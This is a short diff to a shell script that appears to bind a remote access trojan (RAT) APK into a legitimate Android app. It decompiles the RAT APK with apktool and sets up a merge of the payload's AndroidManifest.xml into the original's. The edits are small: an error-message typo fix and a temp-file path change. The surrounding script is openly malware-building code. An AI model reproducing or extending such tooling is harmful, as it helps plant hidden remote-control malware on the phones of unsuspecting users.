@@ -180,7 +180,7 @@ $APKTOOL d -f -o $MY_PATH/temp/payload $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
-  echo -e $red "[!] Failed to decompile RAT APK file"ls
+  echo -e $red "[!] Failed to decompile RAT APK file"
   exit $rc
 fi
 
@@ -202,7 +202,7 @@ for i in `seq 1 4`; do
   placeholder="$placeholder$hex"
 done
 echo "placeholder value: $placeholder" >>$LOG_FILE 2>&1
-tmp_perms_file=$MY_PATH/perms.tmp
+tmp_perms_file=$MY_PATH/temp/perms.tmp
 original_manifest_file=$MY_PATH/temp/original/AndroidManifest.xml
 payload_manifest_file=$MY_PATH/temp/payload/AndroidManifest.xml
 merged_manifest_file=$MY_PATH/temp/original/AndroidManifest.xml.merged
